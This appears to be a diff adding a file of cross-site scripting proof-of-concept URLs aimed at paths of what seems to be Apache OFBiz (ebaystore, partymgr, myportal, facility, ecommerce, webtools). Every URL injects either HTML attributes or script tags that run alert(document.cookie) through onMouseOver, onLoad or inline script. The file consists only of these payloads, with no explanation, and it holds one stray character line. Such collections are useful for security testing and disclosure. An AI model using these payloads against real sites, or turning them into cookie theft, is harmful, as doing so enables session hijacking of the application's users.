@@ -1,0 +1,12 @@
+https://www.example.com/ebaystore/control/exportProductListing?productStoreId=90100&quot; style=&quot;width:100%25;height:100%25;display:block;position:absolute;top:0px;left:0px&quot; onMouseOver=&quot;alert(document.cookie)
+l
+
+https://www.example.com/partymgr/control/viewprofile?&amp;partyId=aa&quot; style=&quot;width:100%25;height:100%25;display:block;position:absolute;top:0px;left:0px&quot; onMouseOver=&quot;alert(document.cookie)
+
+https://www.example.com/myportal/control/showPortalPage?period=week &amp;start=1266796800000\&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+
+https://www.example.com/facility/control/ReceiveReturn&quot;&lt;b&gt;&lt;body onLoad=&quot;alert(document.cookie)&quot;&gt;&lt;br&gt;&lt;div&gt;&gt;&lt;!--
+
+http://www.example.com/ecommerce/control/ViewBlogArticle?contentId=BLG10000\&lt;script&gt; alert(document.cookie)&lt;/script&gt;&amp;blogContentId=BLOGROOTBIGAL 
+
+https://www.example.com/webtools/control/FindGeneric?entityName=AccommodationClass\&lt;script&gt; alert(document.cookie)&lt;/script&gt;&amp;find=true&amp;VIEW_SIZE=50&amp;VIEW_INDEX=0
